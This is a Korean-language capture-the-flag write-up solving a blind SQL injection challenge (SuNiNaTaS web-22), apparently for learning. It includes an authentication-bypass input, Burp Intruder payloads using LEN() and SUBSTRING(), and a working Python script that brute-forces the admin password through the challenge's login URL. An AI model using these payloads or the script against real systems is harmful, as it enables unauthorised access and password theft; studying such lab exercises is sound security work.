# web-22

## blind SQL injection

### 문제 설명
    id, pw 입력란이 있다. 
    Hint로 guest, guest가 주어져있고, admin의 pw를 알아내야한다. 
    select, union, or 등등 많은 구문이 filtering되고 있다.

    정상 로그인시, OK username
    틀린 정보 입력시, False
    필터링 구문 입력시, No hacking

    SQL 구문을 삽입하여도 출력하는 정보는 참, 거짓이 전부이다. (Blind)

### SQL 구조 파악
- 입력값이 SQL 구문에 어떻게 쓰이는지 알아낸다. 
- `SELECT * FROM user WHERE id='아이디' AND pw='비번'`   
- id=`admin' or 1--`, pw=`a`을 넣으면 admin으로 로그인 되는 것을 확인한다.   

### 비번 길이 알아내기
- burpsuite intruder payload
- `admin' AND LENGTH(pw)=§a§--` 1~20까지 넣어본다.
- 다 틀렸다고 나온다.. mySQL이 아닌갑다.
- `admin AND LEN(pw)=§a§` mssql의 LEN() 함수를 이용해본다.
- 10일때, 로그인에 성공한다. 즉, pw의 길이는 10이다.

### 비번 문자열 알아내기
- burpsuite intruder payload
- `admin' AND SUBSTRING(pw,1,1)='§a§'--`
    - SUBSTRING([칼럼명], [시작위치], [길이])
    - 따라서 윗구문은 pw칼럼의 첫번째 문자를 알아내는 payload임.
- payload type: Brute forcer// 알파벳, 숫자 모두 set에 추가
- `SUBSTRING(pw,2,1)='§a§'--` 시작위치를 바꿔가면서 10번하면 되긴한데.. 이걸 파이썬 코딩으로 한방에! 시원하게! 알아내봅시다!

### 파이썬 스크립트 작성

    import requests
    from bs4 import BeautifulSoup

    for i in range(1, 20):
        URL = f"http://suninatas.com/challenge/web22/web22.asp?id=admin'+AND+LEN(pw)={i}--&pw=1"
        res = requests.get(URL)
        soup = BeautifulSoup(res.text, 'html.parser')
        try:
            target = soup.find_all("font")[2].get_text()
            if target == 'admin':
                pw_len = i
                break
        except:
            pass

    pw = []
    for i in range(1, pw_len+1):
        for j in range(32, 128):
            payload = chr(j)
            URL = f"http://suninatas.com/challenge/web22/web22.asp?id=admin'+AND+SUBSTRING(pw,{i},1)='{payload}'--&pw=a"
            res = requests.get(URL)
            soup = BeautifulSoup(res.text, 'html.parser')
            try:
                target = soup.find_all("font")[2].get_text()
                if target == 'admin':
                    pw.append(payload)
            except:
                pass

    pw = "".join(pw)
    print(f"password: {pw}")

- 돌리면, `password: N1c3Bilnl)` 비번이 한방에 나온다. 

> 블라인드 SQL injection은 데이터가 눈에 보이게 출력되지 않고, 렌딩페이지의 작은 차이로 데이터의 유무만 판단할 수 있는 경우에 이용된다.   
이 문제에서는 로그인에 성공이 되는지 마는지로 데이터를 찾아내었다.    
burpsuite말고, 파이썬 스크립트로도 문제를 풀어봤는데 재밌네.